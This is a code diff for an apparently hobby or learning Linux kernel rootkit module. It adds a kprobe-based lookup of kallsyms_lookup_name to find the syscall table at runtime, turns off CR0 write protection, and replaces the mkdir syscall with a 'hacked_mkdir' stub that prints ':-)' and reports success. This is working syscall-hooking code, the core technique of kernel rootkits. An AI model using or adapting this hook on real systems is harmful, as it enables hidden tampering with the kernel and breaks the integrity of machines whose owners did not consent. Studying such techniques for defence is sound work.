@@ -2,6 +2,7 @@
 #include <linux/syscalls.h>
 #include <linux/kallsyms.h>
 #include <linux/kernel.h>
+#include <linux/kprobes.h>
 
 #include "include/sys_calls.h"
 
@@ -16,6 +17,28 @@ static asmlinkage long hacked_mkdir(const char *path, mode_t mode) {
 	printk(KERN_INFO ":-)\n");
 
 	return 0;
+}
+
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+
+static unsigned long *get_syscall_table(void) {
+	unsigned long *sct = NULL;
+	kallsyms_lookup_name_t lookup_name = NULL;
+	struct kprobe kp = {
+		.symbol_name = "kallsyms_lookup_name"
+	};
+
+	if (register_kprobe(&kp) < 0) {
+		printk("Couldn't register kprobe\n");
+		return NULL;
+	}
+
+	unregister_kprobe(&kp);
+	
+	lookup_name = (kallsyms_lookup_name_t)kp.addr;
+	sct = (unsigned long *)lookup_name("sys_call_table");
+	printk("sys_call_table: %px\n", sct);
+	return sct;
 }
 
 static inline void _write_cr0(unsigned long val) {
@@ -35,10 +58,9 @@ static void enable_write_protection(void) {
 }
 
 int sys_calls_init(void) {
-	disable_write_protection();
 
-	// TODO: make it dynamic, not hard coded
-	syscall_table = (unsigned long *)0xffffffff84c00300;
+	disable_write_protection();
+	syscall_table = get_syscall_table();
 	original_mkdir = (mkdir_t)syscall_table[__NR_mkdir];
 	syscall_table[__NR_mkdir] = (sys_call_ptr_t)hacked_mkdir;
 
